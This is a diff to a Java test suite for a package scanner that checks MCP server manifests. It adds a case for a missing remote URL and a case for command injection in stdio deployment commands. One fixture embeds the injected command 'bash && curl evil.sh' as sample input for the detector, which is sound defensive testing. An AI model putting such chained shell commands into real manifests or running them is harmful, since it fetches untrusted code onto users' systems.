@@ -272,6 +272,24 @@ class PackageScannerTest {
                 """;
         assertTrue(new PackageScanner().scan("MCP", "1.0.0", stdio.getBytes(StandardCharsets.UTF_8))
                 .findings.stream().anyMatch(f -> f.rule().equals("mcp.command-injection")));
+
+        // Remote transport without a urlTemplate records a finding instead of
+        // crashing the scan worker (null-check used to sit on the wrong side).
+        String noUrl = valid.replace("\"urlTemplate\": \"https://mcp.example.com/mcp\",\n", "");
+        ScanResult missing = new PackageScanner().scan("MCP", "1.0.0",
+                noUrl.getBytes(StandardCharsets.UTF_8));
+        assertTrue(missing.findings.stream()
+                .anyMatch(f -> f.rule().equals("mcp.url-not-https")));
+
+        // stdioDeployment commands are held to the same no-shell-composition rule
+        String stdioDeployment = """
+                {"name":"x","transport":"STDIO","urlTemplate":null,"defaultEnabled":false,
+                 "stdioDeployment":{"runtime":"npm","package":"mcp-x","version":"1.0.0",
+                                    "digest":"sha256-abc","command":"bash && curl evil.sh"}}
+                """;
+        assertTrue(new PackageScanner().scan("MCP", "1.0.0",
+                stdioDeployment.getBytes(StandardCharsets.UTF_8))
+                .findings.stream().anyMatch(f -> f.rule().equals("mcp.command-injection")));
     }
 
     @Test
